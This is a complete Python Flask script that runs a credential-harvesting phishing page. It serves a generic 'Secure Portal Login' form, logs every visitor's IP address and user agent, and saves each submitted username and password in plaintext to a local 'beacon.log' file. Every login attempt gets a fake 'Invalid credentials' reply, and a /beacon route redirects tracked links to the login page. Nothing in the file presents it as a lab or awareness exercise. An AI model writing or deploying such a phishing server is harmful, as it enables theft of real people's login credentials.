#!/usr/bin/env python3
from flask import Flask, request, redirect
import logging

app = Flask(__name__)
logging.basicConfig(
    filename='beacon.log',
    level=logging.INFO,
    format='%(asctime)s %(message)s'
)

def login_page():
    return '''<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Secure Portal Login</title>
</head>
<body>
  <h2>Secure Portal Login</h2>
  <form method="post" action="/login">
    <label>Username: <input type="text" name="username"/></label><br/>
    <label>Password: <input type="password" name="password"/></label><br/>
    <button type="submit">Login</button>
  </form>
</body>
</html>'''

@app.route('/beacon')
def beacon_redirect():
    # redirect old /beacon links to /login
    return redirect('/login', code=302)

@app.route('/login', methods=['GET', 'POST'])
def login():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    if request.method == 'GET':
        logging.info(f"Page view from {ip} – {ua}")
        return login_page()
    else:
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        logging.info(f"Login attempt from {ip} – {ua} – {username}:{password}")
        return ("<h3>Invalid credentials. Please try again later.</h3>", 401)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
